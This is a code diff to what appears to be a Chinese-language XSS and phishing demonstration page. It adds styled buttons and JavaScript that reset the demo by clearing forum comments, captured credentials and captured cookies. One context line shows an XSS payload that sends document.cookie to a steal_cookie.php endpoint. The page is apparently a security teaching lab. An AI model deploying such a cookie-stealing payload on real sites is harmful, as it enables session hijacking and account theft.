@@ -68,6 +68,69 @@
             transition: transform 0.2s;
         }
         .btn-demo:hover { transform: scale(1.05); }
+        .clean-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 10px;
+        }
+        .btn-clean {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px;
+            border: none;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.3);
+        }
+        .btn-clean:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(233, 69, 96, 0.5);
+        }
+        .btn-clean:active {
+            transform: translateY(-1px);
+        }
+        .btn-icon {
+            font-size: 20px;
+        }
+        .btn-text {
+            font-size: 14px;
+        }
+        .status-message {
+            margin-top: 20px;
+            padding: 12px 18px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+            animation: slideIn 0.3s ease;
+        }
+        .status-success {
+            background: rgba(78, 205, 196, 0.2);
+            border-left: 4px solid #4ecdc4;
+            color: #4ecdc4;
+        }
+        .status-error {
+            background: rgba(233, 69, 96, 0.2);
+            border-left: 4px solid #e94560;
+            color: #e94560;
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
         .btn-danger {
             background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
         }
@@ -181,6 +244,35 @@
         </div>
 
         <div class="demo-grid">
+            <!-- 一键清理功能 -->
+            <div class="demo-card">
+                <div class="card-header">
+                    <span class="card-icon">🗑️</span>
+                    <span class="card-title">一键清理功能</span>
+                </div>
+                <div class="card-body">
+                    <p style="margin-bottom: 20px;">快速清理演示数据，重置演示环境</p>
+                    <div class="clean-buttons">
+                        <button onclick="clearComments()" class="btn-clean">
+                            <span class="btn-icon">💬</span>
+                            <span class="btn-text">清理论坛留言</span>
+                        </button>
+                        <button onclick="clearCredentials()" class="btn-clean">
+                            <span class="btn-icon">🔑</span>
+                            <span class="btn-text">清空凭据数据</span>
+                        </button>
+                        <button onclick="clearCookies()" class="btn-clean">
+                            <span class="btn-icon">🍪</span>
+                            <span class="btn-text">清空Cookie数据</span>
+                        </button>
+                    </div>
+                    <div id="clearStatus" class="status-message"></div>
+                </div>
+            </div>
+            
+            <!-- 钓鱼平台演示 -->
+
+            
             <div class="demo-card">
                 <div class="card-header">
                     <span class="card-icon">💬</span>
@@ -550,6 +642,71 @@ img.src = 'steal_cookie.php?cookie=' + encodeURIComponent(document.cookie);
             navigator.clipboard.writeText(text).then(function() {
                 alert('Payload已复制到剪贴板！\n\n请粘贴到论坛评论区进行测试。');
             });
+        }
+        
+        // 清理论坛留言
+        function clearComments() {
+            if(confirm('确定要清空所有论坛留言吗？')) {
+                fetch('clear_forum_comments.php')
+                    .then(response => response.json())
+                    .then(data => {
+                        const statusDiv = document.getElementById('clearStatus');
+                        statusDiv.style.display = 'block';
+                        if(data.success) {
+                            statusDiv.innerHTML = '✅ ' + data.message;
+                            statusDiv.style.background = 'rgba(78, 205, 196, 0.2)';
+                        } else {
+                            statusDiv.innerHTML = '❌ ' + data.message;
+                            statusDiv.style.background = 'rgba(255, 107, 107, 0.2)';
+                        }
+                        setTimeout(() => statusDiv.style.display = 'none', 3000);
+                    })
+                    .catch(error => {
+                        const statusDiv = document.getElementById('clearStatus');
+                        statusDiv.style.display = 'block';
+                        statusDiv.innerHTML = '❌ 清理失败：' + error;
+                        statusDiv.style.background = 'rgba(255, 107, 107, 0.2)';
+                    });
+            }
+        }
+        
+        // 清空凭据数据
+        function clearCredentials() {
+            if(confirm('确定要清空所有窃取的凭据吗？')) {
+                fetch('clear_credentials.php')
+                    .then(response => response.json())
+                    .then(data => {
+                        showStatus(data.success ? 'success' : 'error', data.message);
+                    })
+                    .catch(error => {
+                        showStatus('error', '清理失败：' + error);
+                    });
+            }
+        }
+        
+        // 清空Cookie数据
+        function clearCookies() {
+            if(confirm('确定要清空所有窃取的Cookie吗？')) {
+                fetch('clear_cookies.php')
+                    .then(response => response.json())
+                    .then(data => {
+                        showStatus(data.success ? 'success' : 'error', data.message);
+                    })
+                    .catch(error => {
+                        showStatus('error', '清理失败：' + error);
+                    });
+            }
+        }
+        
+        // 显示状态消息
+        function showStatus(type, message) {
+            const statusDiv = document.getElementById('clearStatus');
+            statusDiv.style.display = 'block';
+            statusDiv.className = 'status-message status-' + type;
+            statusDiv.innerHTML = (type === 'success' ? '✅ ' : '❌ ') + message;
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 3000);
         }
     </script>
 </body>
